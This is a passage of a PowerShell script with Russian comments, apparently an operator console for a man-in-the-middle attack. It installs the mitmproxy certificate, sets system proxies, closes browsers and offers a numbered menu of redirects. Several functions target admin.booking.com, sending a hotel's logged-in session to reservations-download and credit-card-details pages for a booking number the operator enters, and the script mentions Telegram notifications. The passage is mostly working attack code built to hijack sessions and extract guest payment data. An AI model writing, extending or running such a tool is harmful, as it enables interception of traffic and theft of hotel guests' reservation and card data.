    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Start-Mitmdump
    
    Log-Write "Operation 16: Function 13 (Booking Hotel Redirect) enabled."
    Log-Write "Function 15 (Booking Hotel Security Redirect) will activate after function 13 completes."
}

function Enable-CustomRedirect {
    Log-Write "Starting FUNCTION 17..."
    
    # ВАЖНО: ОЧИЩАЕМ ВСЕ ФЛАГИ функции 17
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    
    # Даем время для очистки
    Start-Sleep -Milliseconds 500
    
    Write-Host ""
    Write-Host "=== FUNCTION 17: CUSTOM ONE-TIME REDIRECT ==="
    Write-Host ""
    Write-Host "[INFO] This function will redirect the FIRST request to FROM URL" 
    Write-Host "       to TO URL, then automatically disable itself."
    Write-Host "       Works with ANY domains (bbc.com, cnn.com, etc.)"
    Write-Host ""
    
    # Ask for FROM URL
    do {
        $fromDomain = Read-Host "Enter FULL FROM URL (e.g., https://bbc.com)"
        if ($fromDomain -notmatch '^https?://') {
            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
            Write-Host "Example: https://www.bbc.com" 
            Write-Host "         https://cnn.com"
            Write-Host "         http://example.com"
            continue
        }
        
        # Проверяем, что URL выглядит корректно
        if ($fromDomain -notmatch '^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}') {
            Write-Host "WARNING: URL doesn't look like a valid domain" -ForegroundColor Yellow
            $confirm = Read-Host "Continue anyway? (y/n)"
            if ($confirm -ne 'y') {
                continue
            }
        }
        break
    } while ($true)
    
    # Ask for TO URL
    do {
        $toDomain = Read-Host "Enter FULL TO URL"
        if ($toDomain -notmatch '^https?://') {
            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
            Write-Host "Example: https://www.google.com" 
            Write-Host "         https://example.com"
            Write-Host "         http://redirect-target.com"
            continue
        }
        
        # Предупреждение о редиректе на тот же домен
        $fromHost = $fromDomain -replace '^https?://(www\.)?', ''
        $toHost = $toDomain -replace '^https?://(www\.)?', ''
        if ($fromHost -eq $toHost) {
            Write-Host "WARNING: FROM and TO domains are the same!" -ForegroundColor Yellow
            Write-Host "This might cause infinite redirects!"
            $confirm = Read-Host "Continue anyway? (y/n)"
            if ($confirm -ne 'y') {
                continue
            }
        }
        break
    } while ($true)
    
    # Save settings to files
    Set-Content -Path $CustomRedirectFromFile -Value $fromDomain.Trim() -Force
    Set-Content -Path $CustomRedirectToFile -Value $toDomain.Trim() -Force
    
    Log-Write ("[F17] Configured: {0} -> {1}" -f $fromDomain, $toDomain)
    Write-Host ""
    Write-Host ("[CONFIGURED] First request to: {0}" -f $fromDomain) -ForegroundColor Green
    Write-Host ("Will be redirected to: {0}" -f $toDomain) -ForegroundColor Green
    Write-Host ""
    Write-Host "[IMPORTANT] Function will:" -ForegroundColor Cyan
    Write-Host "1. Redirect ONLY the FIRST matching request"
    Write-Host "2. Work with ANY domain (old or new)"
    Write-Host "3. Auto-disable after first use"
    Write-Host "4. Send notification to Telegram"
    Write-Host ""
    
    # Убедимся, что папка существует
    $flagDir = Split-Path $CustomRedirectFlag
    if (-not (Test-Path $flagDir)) {
        New-Item -ItemType Directory -Path $flagDir -Force | Out-Null
    }
    
    # Create activation flag
    Set-Content -Path $CustomRedirectFlag -Value "ACTIVE" -Force
    
    # Убедимся, что DONE flag удален
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    
    # Disable other flags
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
    
    # Restart mitmdump
    Start-Mitmdump
    
    Log-Write "[F17] Custom one-time redirect enabled."
    Write-Host ""
    Write-Host "✅ Function 17 ACTIVATED" -ForegroundColor Green
    Write-Host "   Next request to $fromDomain will be redirected" -ForegroundColor Cyan
    Write-Host ""
}

function Clear-Function17 {
    Log-Write "Clearing Function 17..."
    
    Remove-Item -Path $CustomRedirectFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -Force -ErrorAction SilentlyContinue
    
    Write-Host ""
    Write-Host "✅ Function 17 completely cleared" -ForegroundColor Green
    Write-Host "   All flags and configuration removed"
    Write-Host "   Ready for new configuration"
    Write-Host ""
    
    Log-Write "Function 17 cleared"
}

function Enable-BookingReservationsRedirect {
    Log-Write "Starting 18..."
    
    Write-Host ""
    Write-Host "=== RESERVATIONS DOWNLOAD REDIRECT ==="
    Write-Host ""
    
    # Get hotel_id from admin
    do {
        $hotelId = Read-Host "Enter hotel_id"
        if ($hotelId -notmatch '^\d+$') {
            Write-Host "ERROR: hotel_id must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    # Get reportId from admin
    do {
        $reportId = Read-Host "Enter reportId"
        if ($reportId -notmatch '^\d+$') {
            Write-Host "ERROR: reportId must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    # Save parameters to files
    Set-Content -Path $BookingReservationsHotelIdFile -Value $hotelId -Force
    Set-Content -Path $BookingReservationsReportIdFile -Value $reportId -Force
    
    # Create activation flag
    if (-not (Test-Path (Split-Path $BookingReservationsFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingReservationsFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingReservationsFlag -Force | Out-Null
    
    # Disable other flags
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    
    Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
    Write-Host ""
    Write-Host "[INFO] Function 18: Reservations download redirect enabled"
    Write-Host "       Redirects admin.booking.com/hotel/* -> reservations_download.html"
    Write-Host ""
    
    Start-Mitmdump
    
    Log-Write "Booking reservations download redirect enabled (function 18)."
}

function Enable-BookingCCDetailsRedirect {
    Log-Write "Starting 19..."
    
    Write-Host ""
    Write-Host "=== CREDIT CARD DETAILS REDIRECT ==="
    Write-Host ""
    
    # Get bn (booking number) from admin
    do {
        $bn = Read-Host "Enter bn (booking number)"
        if ($bn -notmatch '^\d+$') {
            Write-Host "ERROR: bn must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    # Get hotel_id from admin
    do {
        $hotelId = Read-Host "Enter hotel_id"
        if ($hotelId -notmatch '^\d+$') {
            Write-Host "ERROR: hotel_id must be a number" -ForegroundColor Red
            continue
        }
        break
    } while ($true)
    
    # Save parameters to files
    Set-Content -Path $BookingCCDetailsBnFile -Value $bn -Force
    Set-Content -Path $BookingCCDetailsHotelIdFile -Value $hotelId -Force
    
    # Create activation flag
    if (-not (Test-Path (Split-Path $BookingCCDetailsFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingCCDetailsFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingCCDetailsFlag -Force | Out-Null
    
    # Disable other flags
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
    
    Log-Write ("Booking CC details redirect enabled with bn={0}, hotel_id={1}" -f $bn, $hotelId)
    Write-Host ""
    Write-Host "[INFO] Function 19: Credit card details redirect enabled"
    Write-Host "       Redirects admin.booking.com -> secure-admin.booking.com/booking_cc_details.html"
    Write-Host ""
    
    Start-Mitmdump
    
    Log-Write "Booking CC details redirect enabled (function 19)."
}

# ---------------- MAIN ----------------
Ensure-WorkDir
Log-Write "Manager starting."

# Reset all
Reset-Proxy-And-Stop-Mitmdump
Clear-SystemProxies

# Ensure CA installed
Ensure-MitmCA | Out-Null

# Ask user for redirect URL
do {
    $redirectURL = Read-Host "Enter redirect target URL (include https://) or press Enter for empty"
    
    if ([string]::IsNullOrWhiteSpace($redirectURL)) {
        # Пользователь просто нажал Enter - сохраняем пустую строку
        Set-Content -Path $RedirectFile -Value "" -Force
        Log-Write ("[INFO] Redirect target set to EMPTY - only special functions will work")
        Write-Host ""
        Write-Host "[INFO] REDIRECT TARGET: EMPTY" 
        Write-Host "       Only special functions (7-19) will work" 
        Write-Host "       Force/One-shot redirects will be disabled" 
        Write-Host ""
        break
    }
    elseif ($redirectURL -match '^https?://') {
        # Пользователь ввел корректный URL
        Set-Content -Path $RedirectFile -Value $redirectURL -Force
        Log-Write ("Target URL saved to {0}" -f $RedirectFile)
        Write-Host ""
        Write-Host "[OK] Redirect target saved: $redirectURL" 
        Write-Host ""
        break
    } else {
        # Пользователь ввел некорректный URL
        Write-Host "ERROR: Invalid URL format. Must start with http:// or https://" -ForegroundColor Red
        Write-Host "Example valid URLs:" 
        Write-Host "  https://www.example.com/" 
        Write-Host "  http://localhost:8080" 
        Write-Host "  https://admin.booking.com/hotel/" 
        Write-Host ""
        Write-Host "Or just press Enter to skip (only special functions will work)" -ForegroundColor Cyan
        Write-Host ""
    }
} while ($true)

# Ask user about browser closing
Write-Host "`nChoose browser closing option:"
Write-Host "1) Full close"
Write-Host "2) Graceful"
Write-Host "3) Don't close"
$closeChoice = Read-Host "Choose option (1-3)"

$closeOption = switch ($closeChoice) {
    "1" { "full" }
    "2" { "graceful" }
    "3" { "none" }
    default { "graceful" }
}

Close-Browsers-Gracefully -closeOption $closeOption

# Function menu
while ($true) {
    Write-Host ""
    Write-Host "=========== MITM REDIRECT MANAGER ==========="
    Write-Host " BASIC:"
    Write-Host "   1) RESET (stop all)"
    Write-Host "   2) One-shot redirect"
    Write-Host "   3) Force redirect"
    Write-Host "   4) DISABLE all redirects"
    Write-Host "   5) Tail log"
    Write-Host "   6) EXIT"
    Write-Host ""
    Write-Host " FUNCTIONS:"
    Write-Host "   7) Messaging redirect (function 7)"
    Write-Host "   8) Provider redirect (function 8)"
    Write-Host "   9) User redirect (function 9)"
    Write-Host "   10) Phone redirect (function 10)"
    Write-Host "   11) Operation 11 (7 -> 8)"
    Write-Host "   12) Operation 12 (9 -> 10)"
    Write-Host "   13) Phone settings force (function 13)"
    Write-Host "   14) Disable function 13"
    Write-Host "   15) Messages settings force (function 15)"
    Write-Host "   16) Operation 16 (13 -> 15)"
    Write-Host "   17) Custom one-time redirect (function 17)"
    Write-Host "   18) Reservations download (function 18)"
    Write-Host "   19) Credit card details (function 19)"
	Write-Host "   20) Clear Function 17"
    Write-Host "==========================================="
    $opt = Read-Host "Enter option"

    switch ($opt) {
        "1" {
            Reset-Proxy-And-Stop-Mitmdump;
            Clear-SystemProxies | Out-Null;
            Log-Write "Full reset performed."
        }
        "2" { Enable-OneShotRedirect }
        "3" { Enable-ForceRedirect }
        "4" {
            Remove-Item -Path $ForceFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $OneShotFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $MessageFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $ProviderFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $UserFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $SecurityFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $Operation11Flag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $Operation12Flag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingHotelSecurityFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $Operation16Flag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $CustomRedirectFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $CustomRedirectFromFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $CustomRedirectToFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $CustomRedirectDoneFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingReservationsFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingReservationsHotelIdFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingReservationsReportIdFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingCCDetailsFlag -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingCCDetailsBnFile -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BookingCCDetailsHotelIdFile -Force -ErrorAction SilentlyContinue
            Clear-SystemProxies | Out-Null
            Reset-Proxy-And-Stop-Mitmdump
            Log-Write "All redirects disabled and proxy cleared."
        }
        "5" {
            if (Test-Path $LogFile) {
                Get-Content -Path $LogFile -Tail 200 -Wait
            } else {
                Write-Host "Log not found."
            }
        }
        "6" { Safe-Exit }
        "7" { Enable-MessageRedirect }
        "8" { Enable-ProviderRedirect }
        "9" { Enable-UserRedirect }
        "10" { Enable-SecurityRedirect }
        "11" { Enable-Operation11Redirect }
        "12" { Enable-Operation12Redirect }
        "13" { Enable-BookingHotelRedirect }
        "14" { Disable-BookingHotelRedirect }
        "15" { Enable-BookingHotelSecurityRedirect }
        "16" { Enable-Operation16Redirect }
        "17" { Enable-CustomRedirect }
        "18" { Enable-BookingReservationsRedirect }
        "19" { Enable-BookingCCDetailsRedirect }
		"20" { Clear-Function17 }
        default { Write-Host "Invalid choice" }
    }
}
